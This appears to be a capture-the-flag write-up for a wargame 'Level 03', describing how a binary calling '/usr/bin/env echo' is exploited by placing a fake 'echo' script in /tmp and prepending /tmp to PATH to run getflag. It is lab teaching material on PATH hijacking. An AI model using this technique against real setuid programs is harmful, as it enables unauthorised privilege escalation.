# Level 03

## Analysis

In the user's home directory, we discovered a binary file. Utilizing the `strings` command, which prints the sequences of printable characters in files, we identified a line that appeared suspicious. This line seemed to invoke an external binary from a path named `echo`.

```sh
strings level03
...
/usr/bin/env echo Exploit me
...
```

To exploit this, we created a shell script named `echo` and manipulated the environment's PATH variable to prioritize our script by adding it to the path.

```bash
cat << EOF > /tmp/echo
#!/bin/sh
getflag
EOF
chmod +x /tmp/echo
export PATH=/tmp:$PATH
```

Executing the `level03` binary thereafter used our script, thereby printing the flag.